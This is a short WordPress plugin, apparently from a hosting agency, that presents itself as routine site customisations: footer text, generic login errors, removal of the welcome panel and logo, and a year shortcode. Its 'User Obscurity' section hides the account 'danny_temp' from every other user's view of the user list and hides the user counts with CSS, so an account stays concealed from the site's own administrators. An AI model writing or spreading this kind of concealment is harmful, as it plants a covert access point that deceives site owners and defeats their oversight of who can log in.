<?php
/**
 * Plugin Name: Skylayer Functions
 * Plugin URI: https://skylayer.eu
 * Description: Custom functions to improve WordPress sites deployed by Skylayer.
 * Author: Daniel Slyman (Skylayer)
 * Author URI: https://skylayer.eu
 * Version: 1.1
 */

/* Place custom code below this line. */



/* Admin Footer Text. */
function remove_footer_admin () {
 
echo 'Thank you for choosing <a href="https://skylayer.eu" target="_blank">Skylayer</a>.</p>';
 
}

add_filter('admin_footer_text', 'remove_footer_admin');
/* Admin Footer Text */


/* Login Errors. */
function no_wordpress_errors(){
  return 'Something is wrong!';
}
add_filter( 'login_errors', 'no_wordpress_errors' );
/* Admin Footer Text. */


/* Welcome Panel. */
remove_action('welcome_panel', 'wp_welcome_panel');
/* Welcome Panel. */


/* WP Toolbar Logo. */
add_action( 'admin_bar_menu', 'remove_wp_logo', 999 );
 
function remove_wp_logo( $wp_admin_bar ) {
    $wp_admin_bar->remove_node( 'wp-logo' );
}
/* WP Toolbar Logo. */


/* Copyright. */
function currentYear( $atts ){
    return date('Y');
}
add_shortcode( 'year', 'currentYear' );
/* Copyright. */


/* User Obscurity. */
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username == 'danny_temp') { 

  }

  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'danny_temp'",$user_search->query_where);
  }
}

function hide_user_count(){
?>
<style>
.wp-admin.users-php span.count {display: none;}
</style>
<?php
}

add_action('admin_head','hide_user_count');

/* User Obscurity. */




/* Place custom code above this line. */
?>
